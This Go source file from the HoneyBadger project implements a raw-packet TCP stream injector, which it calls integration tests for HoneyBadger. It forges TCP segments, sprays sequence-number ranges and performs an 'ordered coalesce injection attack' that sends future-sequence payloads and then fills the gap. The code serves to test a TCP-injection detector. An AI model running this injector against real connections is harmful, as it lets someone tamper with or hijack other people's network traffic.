/*
 *    injector.go - TCP stream injector API - "integration tests" for HoneyBadger
 *    Copyright (C) 2014, 2015  David Stainton
 *
 *    This program is free software: you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation, either version 3 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package attack

import (
	"github.com/david415/HoneyBadger/types"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"golang.org/x/net/ipv4"
	"net"
	"log"
)

type TCPStreamInjector struct {
	packetConn    net.PacketConn
	pcapHandle    *pcap.Handle
	ipv4RawConn   *ipv4.RawConn
	ipv4Header    *ipv4.Header
	ipv4          layers.IPv4
	eth           *layers.Ethernet
	dot1q         *layers.Dot1Q
	ipv6          layers.IPv6
	tcp           layers.TCP
	ipBuf         gopacket.SerializeBuffer
	tcpPayloadBuf gopacket.SerializeBuffer
	Payload       gopacket.Payload
	isIPv6Mode    bool
}

func (i *TCPStreamInjector) Init(netInterface string, pcapHandle *pcap.Handle, isIPv6Mode bool) error {
	var err error
	i.pcapHandle = pcapHandle
	i.isIPv6Mode = isIPv6Mode
	if isIPv6Mode {
		return nil
	} else {
		i.packetConn, err = net.ListenPacket("ip4:tcp", netInterface)
		if err != nil {
			return err
		}
		i.ipv4RawConn, err = ipv4.NewRawConn(i.packetConn)
		return err
	}
}

func (i *TCPStreamInjector) SetIPv4Layer(iplayer layers.IPv4) error {
	i.ipv4 = iplayer
	i.ipBuf = gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err := i.ipv4.SerializeTo(i.ipBuf, opts)
	if err != nil {
		return err
	}
	i.ipv4Header, err = ipv4.ParseHeader(i.ipBuf.Bytes())
	if err != nil {
		return err
	}
	return nil
}

func (i *TCPStreamInjector) SetIPv6Layer(iplayer layers.IPv6) error {
	i.ipv6 = iplayer
	return nil
}

func (i *TCPStreamInjector) SetLayer1(eth *layers.Ethernet, dot1q *layers.Dot1Q) {
	i.eth = eth
	i.dot1q = dot1q
}

func (i *TCPStreamInjector) SetTCPLayer(tcpLayer layers.TCP) {
	i.tcp = tcpLayer
}

func (i *TCPStreamInjector) SpraySequenceRangePackets(start uint32, count int) error {
	var err error

	currentSeq := types.Sequence(start)
	stopSeq := currentSeq.Add(count)

	for ; currentSeq.Difference(stopSeq) != 0; currentSeq = currentSeq.Add(1) {
		i.tcp.Seq = uint32(currentSeq)
		err = i.Write()
		if err != nil {
			return err
		}
	}
	return nil
}

// SprayFutureAndFillGapPackets is used to perform an ordered coalesce injection attack;
// that is we first inject packets with future sequence numbers and then we fill the gap.
// The gap being the range from state machine's "next Sequence" to the earliest Sequence we
// transmitted in our future sequence series of packets.
func (i *TCPStreamInjector) SprayFutureAndFillGapPackets(start uint32, gap_payload, attack_payload []byte, overlap_future_packet bool) error {
	var err error = nil

	// send future packet
	nextSeq := types.Sequence(start)
	i.tcp.Seq = uint32(nextSeq.Add(len(gap_payload)))
	i.Payload = attack_payload

	err = i.Write()
	if err != nil {
		return err
	}

	if overlap_future_packet == true {
		// overlapping future injection
		i.tcp.Seq = uint32(nextSeq.Add(len(gap_payload) + 7))
		i.Payload = attack_payload

		err = i.Write()
		if err != nil {
			return err
		}
	}

	// fill in gap
	i.tcp.Seq = start
	i.Payload = gap_payload
	err = i.Write()
	if err != nil {
		return err
	}
	return nil
}

func (i *TCPStreamInjector) Write() error {
	log.Print("Write")
	var err error = nil

	if i.isIPv6Mode {
		// XXX
		i.tcp.SetNetworkLayerForChecksum(&i.ipv6)
	} else {
		i.tcp.SetNetworkLayerForChecksum(&i.ipv4)
	}
	if i.isIPv6Mode {
		log.Print("ipv6 mode")
		// XXX
		ipv6PacketBuf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			//ComputeChecksums: false,
			ComputeChecksums: true,
		}
		//err = gopacket.SerializeLayers(ipv6PacketBuf, opts, i.eth, i.dot1q, &i.ipv6, &i.tcp, i.Payload)
		err = gopacket.SerializeLayers(ipv6PacketBuf, opts, i.eth, &i.ipv6, &i.tcp, i.Payload)
		if err != nil {
			log.Print("wtf. failed to decode ipv6 packet")
			return err
		}
		if err := i.pcapHandle.WritePacketData(ipv6PacketBuf.Bytes()); err != nil {
			log.Printf("Failed to send packet: %s\n", err)
			return err
		}
	} else {
		log.Print("ipv4 mode")
		i.tcpPayloadBuf = gopacket.NewSerializeBuffer()
		//	packetPayload := gopacket.Payload(i.Payload)
		packetPayload := i.Payload
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}
		err = gopacket.SerializeLayers(i.tcpPayloadBuf, opts, &i.tcp, packetPayload)
		if err != nil {
			return err
		}
		err = i.ipv4RawConn.WriteTo(i.ipv4Header, i.tcpPayloadBuf.Bytes(), nil)
	}
	return err
}
